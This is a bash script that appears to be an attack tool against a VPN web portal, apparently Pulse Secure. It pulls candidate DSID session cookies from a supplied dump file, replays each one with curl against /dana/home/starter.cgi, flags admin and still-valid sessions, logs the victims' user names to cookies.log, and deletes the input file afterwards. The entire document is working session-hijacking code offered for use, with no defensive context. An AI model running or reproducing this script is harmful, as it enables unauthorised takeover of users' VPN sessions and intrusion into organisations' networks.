#!/bin/bash
if [ ! $1 ] || [ ! $2 ]; then
    echo "where's the cookie and the url ?"
    exit
elif [ -f ".tmp" ]; then
    rm .tmp
fi
cat "${1}" | strings | grep randomVal | cut -b 10- | sort -u > .tmp
cat ".tmp" | while read line; do
    data=$(curl -skI "${2}" -b "DSID=${line}; Path=/")
    if echo "${data}" | grep -q "admin"; then
        echo -e "\n\t[${line}] WOh0oo, admin is here!"
        continue
    elif echo "${data}" | grep -q "/dana/home/starter.cgi"; then
        echo -e "\n\t[${line}] this cookies is crunchy!"
	    data=$(curl -sk "${2}dana/home/starter.cgi" -b "DSID=${line}; Path=/")
        if ! echo "${data}" | grep -q "userinfo_name"; then
            echo -e "\t[to bad, it's expired!]"
        else
		    curl -sk "${2}dana/home/starter.cgi" -b "DSID=${line}; Path=/" | grep "title"
            curl -sk "${2}dana/home/starter.cgi" -b "DSID=${line}; Path=/" | grep "userinfo_name" >> cookies.log
        fi
    fi
done
rm .tmp "${1}"
